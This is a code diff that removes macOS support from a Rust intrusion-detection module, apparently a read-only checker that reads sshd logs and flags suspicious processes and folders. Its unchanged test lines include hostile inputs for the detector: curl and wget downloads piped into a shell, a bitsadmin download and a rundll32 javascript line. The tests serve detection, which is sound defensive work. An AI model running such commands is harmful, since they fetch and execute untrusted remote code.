@@ -5,7 +5,7 @@
 //! s'installe. Chaque signe se juge par une fonction pure, testée sous Linux et sous Wine ; la lecture (journaux,
 //! processus) est propre à chaque système. Lecture seule : rien n'est arrêté, rien n'est envoyé.
 
-// Sous Linux seulement : les parties Windows et macOS ne sont pas encore relues ; le lint y viendra avec elles.
+// Sous Linux seulement : les parties Windows ne sont pas encore relues ; le lint y viendra avec elles.
 #![cfg_attr(target_os = "linux", warn(clippy::arithmetic_side_effects, clippy::as_conversions))]
 
 use std::collections::{HashMap, HashSet};
@@ -97,7 +97,6 @@ pub(crate) fn intrusions(tentatives: &[Tentative]) -> Vec<Intrusion> {
 /// L'adresse et le port d'origine d'une ligne de sshd : ceux du dernier « port » de la ligne. Avant lui, le nom
 /// d'utilisateur tenté est écrit tel que l'attaquant l'a choisi, et peut contenir un faux « from … port … ». Commun à
 /// Linux (journal de systemd) et à OpenSSH pour Windows (journal OpenSSH/Operational), qui écrivent les mêmes messages.
-#[cfg_attr(target_os = "macos", allow(dead_code))]
 pub(crate) fn origine_ssh(ligne: &str) -> Option<(IpAddr, u16)> {
     let mots: Vec<&str> = ligne.split_whitespace().collect();
     let i = mots.iter().rposition(|m| *m == "port")?;
@@ -112,7 +111,6 @@ pub(crate) fn origine_ssh(ligne: &str) -> Option<(IpAddr, u16)> {
 /// (« Invalid user » seul : sinon, ses « Failed password » la comptent déjà), et chaque connexion acceptée, avec son
 /// compte. Seuls comptent les messages qui commencent ainsi : un nom d'utilisateur tenté (« Invalid user Accepted
 /// password for … ») vient de l'attaquant.
-#[cfg_attr(target_os = "macos", allow(dead_code))]
 pub(crate) fn tentatives_ssh_datees<D: Copy>(lignes: &[(D, &str)]) -> Vec<(D, Tentative)> {
     let rate = |l: &str| l.starts_with("Failed password ") || l.starts_with("Failed keyboard-interactive");
     let essayees: HashSet<(IpAddr, u16)> = lignes
@@ -172,7 +170,7 @@ fn conseil(systeme: Os, comptes: &str) -> String {
             "Changez tout de suite le mot de passe de {comptes}, coupez le Bureau à distance s'il ne sert pas, et regardez ce qui s'est passé : vanguard depanner traces",
             "Change the password of {comptes} right away, turn off Remote Desktop if it is not used, and look at what happened: vanguard depanner traces"
         ),
-        Os::Linux | Os::MacOs | Os::Tous => trf!(
+        Os::Linux | Os::Tous => trf!(
             "Changez tout de suite le mot de passe de {comptes} (passwd), coupez la connexion par mot de passe de SSH (PasswordAuthentication no, puis recharger sshd), et regardez ce qui s'est passé : vanguard depanner traces",
             "Change the password of {comptes} right away (passwd), turn off password sign-in for SSH (PasswordAuthentication no, then reload sshd), and look at what happened: vanguard depanner traces"
         ),
@@ -283,72 +281,6 @@ fn tentatives_lues() -> Option<Result<Lues, Constat>> {
     Some(super::windows::evenements::tentatives_lues().map_err(|refus| *refus))
 }
 
-/// Sous macOS : sshd écrit dans le journal unifié, qui ne se lit qu'en lançant « log show » (des minutes, pour une
-/// journée). Sans sshd (Session à distance coupée, le cas courant), rien à lire, comme sous Linux sans serveur SSH.
-#[cfg(target_os = "macos")]
-fn tentatives_lues() -> Option<Result<Lues, Constat>> {
-    let ecoutes =
-        super::sortie("netstat", &["-an", "-p", "tcp"]).map(|netstat| super::unix::lire_netstat(&netstat, true));
-    let services = std::fs::read_to_string("/etc/services").unwrap_or_default();
-    let en_marche =
-        programmes_en_marche().map(|(liste, _)| liste.iter().any(|p| p.nom == "sshd" || p.nom.starts_with("sshd-")));
-    // Un sshd lancé par launchd à chaque connexion, sur le port de sa propre plist (Session à distance recopiée dans
-    // /Library/LaunchDaemons) : aucun sshd ne tourne entre deux connexions, et /etc/services peut dire 22.
-    let lance_par_launchd = std::fs::read_dir("/Library/LaunchDaemons").is_ok_and(|dossier| {
-        dossier
-            .flatten()
-            .any(|f| std::fs::read(f.path()).is_ok_and(|o| plist_de_sshd(&o)))
-    });
-    let sshd = if lance_par_launchd { Some(true) } else { en_marche };
-    tentatives_sans_journal(ecoutes.as_deref(), port_ssh(&services), sshd)
-}
-
-/// Une plist de launchd qui lance sshd (XML ou binaire : le chemin du programme y reste en clair).
-#[cfg(any(target_os = "macos", test))]
-fn plist_de_sshd(octets: &[u8]) -> bool {
-    octets.windows(4).any(|m| m == b"sshd")
-}
-
-/// Le port du service « ssh » d'/etc/services : celui où launchd ouvre Session à distance, 22 sauf s'il a été changé.
-#[cfg(any(target_os = "macos", test))]
-fn port_ssh(services: &str) -> Option<u16> {
-    services.lines().find_map(|l| {
-        let mut mots = l.split('#').next()?.split_whitespace();
-        (mots.next()? == "ssh").then_some(())?;
-        mots.next()?.strip_suffix("/tcp")?.parse().ok()
-    })
-}
-
-/// La décision de macOS, à part pour se tester partout. `ecoutes` : les ports TCP en écoute, `None` si netstat n'a
-/// pas répondu ; `port_ssh` : celui d'/etc/services ; `sshd` : un sshd en marche ou une plist de launchd qui le lance,
-/// `None` si ps n'a pas répondu. Rien à lire seulement si rien n'écoute sur 22 ni sur le port de ssh et qu'aucun sshd
-/// n'est là (un sshd de Homebrew sur un autre port tourne sans arrêt). Un sshd qui n'écoute que la machine elle-même
-/// compte aussi : ses échecs vont au journal non lu. netstat ou ps muets, ou sshd présent : non vérifié, jamais sain.
-#[cfg(any(target_os = "macos", test))]
-fn tentatives_sans_journal(
-    ecoutes: Option<&[(String, u16)]>,
-    port_ssh: Option<u16>,
-    sshd: Option<bool>,
-) -> Option<Result<Lues, Constat>> {
-    let ecoute_ssh = ecoutes.map(|ports| ports.iter().any(|(_, port)| *port == 22 || Some(*port) == port_ssh));
-    let raison = match (ecoute_ssh, sshd) {
-        (Some(false), Some(false)) => return None,
-        (Some(true), _) | (_, Some(true)) => tr!(
-            "sshd écrit dans le journal unifié de macOS, que Vanguard ne lit pas",
-            "sshd writes to macOS's unified log, which Vanguard does not read"
-        ),
-        (None, _) => tr!(
-            "netstat n'a pas dit si sshd écoute",
-            "netstat did not tell whether sshd is listening"
-        ),
-        (Some(false), None) => tr!(
-            "ps n'a pas dit si sshd tourne",
-            "ps did not tell whether sshd is running"
-        ),
-    };
-    Some(Err(impossible("Comptes", raison)))
-}
-
 // ───────────────────────────── Programmes en marche ─────────────────────────────
 
 /// Un programme en marche, tel que le système le donne.
@@ -356,7 +288,7 @@ fn tentatives_sans_journal(
 pub(crate) struct EnMarche {
     pub pid: u32,
     pub parent: Option<u32>,
-    /// Son nom : celui de son fichier sous Windows et macOS, le nom court du noyau sous Linux.
+    /// Son nom : celui de son fichier sous Windows, le nom court du noyau sous Linux.
     pub nom: String,
     /// Le chemin de son programme, quand il se lit (sous Linux, ceux du compte seulement).
     pub chemin: Option<String>,
@@ -365,7 +297,7 @@ pub(crate) struct EnMarche {
     /// Son programme n'est plus sur le disque : effacé après son lancement.
     pub sans_fichier: bool,
     /// Sa naissance (UTC), quand le système la donne. Sous Windows, le numéro d'un parent mort peut passer à un
-    /// processus plus jeune, qui n'est pas ce parent ; Linux et macOS rattachent l'orphelin à un autre parent.
+    /// processus plus jeune, qui n'est pas ce parent ; Linux rattache l'orphelin à un autre parent.
     pub ne: Option<NaiveDateTime>,
 }
 
@@ -854,19 +786,11 @@ fn outil_offensif<'a>(noms: &[&'a str], ligne: &str) -> Option<(&'static str, us
 pub(crate) fn dossier_douteux(chemin: &str, systeme: Os) -> Option<&'static str> {
     let c = chemin.to_lowercase().replace('\\', "/");
     let dans = |d: &str| c.contains(d);
-    // macOS lance une application téléchargée, pas encore déplacée, depuis une copie à part (AppTranslocation) rangée
-    // dans le dossier temporaire du compte : elle vient de Téléchargements.
-    if dans("/downloads/") || dans("/téléchargements/") || dans("/apptranslocation/") {
+    if dans("/downloads/") || dans("/téléchargements/") {
         return Some(tr!("lancé depuis Téléchargements", "started from Downloads"));
     }
     let temporaire = match systeme {
         Os::Windows => dans("/appdata/local/temp/") || dans("/windows/temp/"),
-        Os::MacOs => {
-            ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/"]
-                .iter()
-                .any(|d| c.starts_with(d))
-                || temporaire_du_compte_macos(&c)
-        }
         Os::Linux | Os::Tous => false,
     };
     if temporaire && !maintenance_de_windows(&c) {
@@ -875,7 +799,7 @@ pub(crate) fn dossier_douteux(chemin: &str, systeme: Os) -> Option<&'static str>
             "started from a temporary folder"
         ));
     }
-    if dans("/users/public/") || (systeme == Os::MacOs && dans("/users/shared/")) {
+    if dans("/users/public/") {
         return Some(tr!("rangé dans le dossier Public", "stored in the Public folder"));
     }
     if dans("/$recycle.bin/") || dans("/.trash/") || dans("/.local/share/trash/") {
@@ -904,13 +828,6 @@ fn maintenance_de_windows(chemin: &str) -> bool {
             }
         });
     forme && MAINTENANCE.contains(&fichier)
-}
-
-/// Le dossier temporaire d'un compte sous macOS : `/private/var/folders/<xx>/<…>/T/` (« C » et « X », à côté, sont des
-/// caches où Chrome, par exemple, range une copie de lui-même).
-fn temporaire_du_compte_macos(c: &str) -> bool {
-    let morceaux: Vec<&str> = c.trim_start_matches("/private").split('/').collect();
-    matches!(morceaux.as_slice(), [_, "var", "folders", _, _, "t", _, ..])
 }
 
 /// Interpréteurs dont le vrai programme est le script en argument : un outil offensif en Python ou en PowerShell se
@@ -1331,7 +1248,7 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
 /// seulement en administrateur), Toolhelp32 en secours, sans les lignes de commande. Un chemin que WMI ne donne pas se
 /// demande au processus lui-même, ce que les droits limités permettent pour la plupart.
 #[cfg(windows)]
-#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux et macOS, où la lecture peut échouer
+#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où la lecture peut échouer
 fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
     use super::windows::{processus, wmi};
     let par_wmi = wmi::requete(
@@ -1379,61 +1296,6 @@ fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
         }
         p.sans_fichier = p.chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists());
     }
-    Some((liste, None))
-}
-
-/// Les programmes en marche, demandés au noyau (libproc : le chemin du programme pour tous les comptes, la ligne de
-/// commande pour ceux du compte, la naissance) ; ps en secours tant que le test d'oracle de macos.yml n'a pas prouvé
-/// la lecture native, ou quand elle ne répond pas.
-#[cfg(target_os = "macos")]
-fn programmes_en_marche() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
-    if let Some(liste) = super::macos::noyau::processus(true) {
-        let liste = liste
-            .into_iter()
-            .map(|p| EnMarche {
-                pid: p.pid,
-                parent: Some(p.ppid),
-                nom: p.nom(),
-                sans_fichier: p.chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
-                ligne: p.ligne(),
-                ne: p.ne(),
-                chemin: p.chemin,
-            })
-            .collect();
-        return Some((liste, None));
-    }
-    programmes_ps()
-}
-
-/// Les programmes en marche d'après ps (le chemin du programme, puis la ligne de commande), comme les traces les
-/// lisent : le secours de la lecture native.
-#[cfg(target_os = "macos")]
-fn programmes_ps() -> Option<(Vec<EnMarche>, Option<&'static str>)> {
-    use std::process::Command;
-    let ps = |format: &str| {
-        crate::commande::lancer(Command::new("ps").args(["-axww", "-o", format]).env("LC_ALL", "C"), 20)
-            .filter(|r| r.code == Some(0))
-            .map(|r| r.sortie)
-    };
-    let liste = ps("pid=,ppid=,user=,lstart=,comm=")?;
-    let lignes = ps("pid=,args=")
-        .map(|s| crate::traces::lire_args(&s))
-        .unwrap_or_default();
-    let liste = crate::traces::lire_ps(&liste)
-        .into_iter()
-        .map(|(pid, parent, _, _, programme)| {
-            let chemin = programme.starts_with('/').then(|| programme.clone());
-            EnMarche {
-                pid,
-                parent,
-                nom: nom_de_fichier(&programme).to_string(),
-                sans_fichier: chemin.as_deref().is_some_and(|c| !std::path::Path::new(c).exists()),
-                chemin,
-                ligne: lignes.get(&pid).cloned(),
-                ne: None,
-            }
-        })
-        .collect();
     Some((liste, None))
 }
 
@@ -1643,64 +1505,6 @@ mod tests {
         );
     }
 
-    /// macOS : rien n'écoute sur 22 ni sur le port de ssh et aucun sshd ne tourne : rien à lire, comme sous Linux sans
-    /// serveur SSH. sshd en écoute, même sur la machine elle-même ou sur un autre port, sshd en marche, ou netstat ou
-    /// ps muets : non vérifié, jamais sain.
-    #[test]
-    fn mac_sans_sshd() {
-        let ports = |liste: &[(&str, u16)]| -> Vec<(String, u16)> {
-            liste.iter().map(|(a, p)| ((*a).to_string(), *p)).collect()
-        };
-        let autres = ports(&[("*", 5900), ("127.0.0.1", 631), ("*", 2222)]);
-        assert!(tentatives_sans_journal(Some(&[]), Some(22), Some(false)).is_none());
-        assert!(tentatives_sans_journal(Some(&autres), Some(22), Some(false)).is_none());
-        assert!(tentatives_sans_journal(Some(&autres), None, Some(false)).is_none());
-        for (ecoute, port_ssh, en_marche) in [
-            (ports(&[("*", 22)]), Some(22), Some(false)),
-            (ports(&[("127.0.0.1", 22)]), Some(22), Some(false)),
-            (ports(&[("::1", 22), ("*", 5900)]), Some(22), Some(false)),
-            // Session à distance déplacée par /etc/services : launchd écoute sur 2222.
-            (autres.clone(), Some(2222), Some(false)),
-            // Un sshd de Homebrew lancé avec -p 2222 : il tourne.
-            (autres.clone(), Some(22), Some(true)),
-        ] {
-            let Some(Err(c)) = tentatives_sans_journal(Some(&ecoute), port_ssh, en_marche) else {
-                panic!("sshd compté comme lu : {ecoute:?} {port_ssh:?} {en_marche:?}");
-            };
-            assert!(!c.verifie && c.message.contains("sshd"), "{}", c.message);
-        }
-        let Some(Err(c)) = tentatives_sans_journal(None, Some(22), Some(false)) else {
-            panic!("netstat muet compté comme sain");
-        };
-        assert!(!c.verifie && c.message.contains("netstat"), "{}", c.message);
-        let Some(Err(c)) = tentatives_sans_journal(Some(&autres), Some(22), None) else {
-            panic!("ps muet compté comme sain");
-        };
-        assert!(!c.verifie && c.message.contains("ps"), "{}", c.message);
-        // sshd en écoute sur 22 et ps muet : la raison est le journal non lu, pas ps.
-        let Some(Err(c)) = tentatives_sans_journal(Some(&ports(&[("*", 22)])), Some(22), None) else {
-            panic!("sshd en écoute compté comme lu");
-        };
-        assert!(
-            c.message.contains("sshd") && !c.message.starts_with("ps"),
-            "{}",
-            c.message
-        );
-        assert!(plist_de_sshd(b"<string>/usr/sbin/sshd</string>") && !plist_de_sshd(b"<string>/usr/bin/ssh</string>"));
-    }
-
-    #[test]
-    fn port_ssh_d_etc_services() {
-        let services = "# Network services\n\
-                        sshell 614/tcp\n\
-                        ssh              2222/udp     # SSH Remote Login Protocol\n\
-                        ssh              2222/tcp     # SSH Remote Login Protocol\n\
-                        telnet 23/tcp\n";
-        assert_eq!(port_ssh(services), Some(2222));
-        assert_eq!(port_ssh("#ssh 22/tcp\nssh 22/tcp\n"), Some(22));
-        assert_eq!(port_ssh(""), None);
-    }
-
     /// Une lecture qui a atteint sa borne (les 2 000 échecs les plus récents sous Windows) : sain, jamais sans le dire.
     #[test]
     fn lecture_partielle_dite() {
@@ -1750,7 +1554,7 @@ mod tests {
         );
         assert!(suspect(r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ""#).is_some());
         assert!(suspect("bitsadmin /transfer job http://x.example/a.exe C:\\a.exe").is_some());
-        // Linux et macOS : un script téléchargé ou décodé passé à un shell.
+        // Linux : un script téléchargé ou décodé passé à un shell.
         let e = suspect("sh -c curl -fsSL https://x.example/i.sh?jeton=s3cret | sh").unwrap();
         assert_eq!(e, "sh … curl…");
         assert!(suspect("bash -c wget -qO- http://x.example/a | /bin/bash").is_some());
@@ -2064,26 +1868,6 @@ mod tests {
         assert!(d("/home/alice/.local/share/Trash/files/x", Os::Linux).is_some());
         assert!(d("/tmp/.x/agent", Os::Linux).is_none());
         assert!(d("/usr/bin/bash", Os::Linux).is_none());
-        // macOS : /tmp, le dossier temporaire du compte, Partagé, la corbeille, une application pas encore déplacée.
-        assert!(d("/private/tmp/x", Os::MacOs).is_some());
-        assert!(d("/private/var/folders/ab/cdef123/T/x/agent", Os::MacOs).is_some());
-        assert!(
-            d(
-                "/private/var/folders/ab/cdef123/X/com.google.Chrome.code_sign_clone/x/Google Chrome",
-                Os::MacOs
-            )
-            .is_none()
-        );
-        assert_eq!(
-            d(
-                "/private/var/folders/ab/cdef123/T/AppTranslocation/1234/d/App.app/Contents/MacOS/App",
-                Os::MacOs
-            ),
-            d("/Users/alice/Downloads/App.app/Contents/MacOS/App", Os::MacOs)
-        );
-        assert!(d("/Users/Shared/.x/agent", Os::MacOs).is_some());
-        assert!(d("/Users/alice/.Trash/x", Os::MacOs).is_some());
-        assert!(d("/Applications/Firefox.app/Contents/MacOS/firefox", Os::MacOs).is_none());
     }
 
     /// Un programme lancé d'un dossier douteux : moyen, élevé s'il a été effacé depuis ; son chemin est montré.
@@ -2522,7 +2306,7 @@ mod entrees_hostiles {
                 }
             }
             let p = EnMarche { nom: l.clone(), chemin: Some(l.clone()), ligne: Some(l.clone()), ..EnMarche::default() };
-            for systeme in [Os::Linux, Os::Windows, Os::MacOs] {
+            for systeme in [Os::Linux, Os::Windows] {
                 if let Some(s) = juger_programme(&p, systeme) {
                     prop_assert!(s.extrait.is_none_or(|e| e.chars().count() <= LONGUEUR_EXTRAIT + 1));
                 }
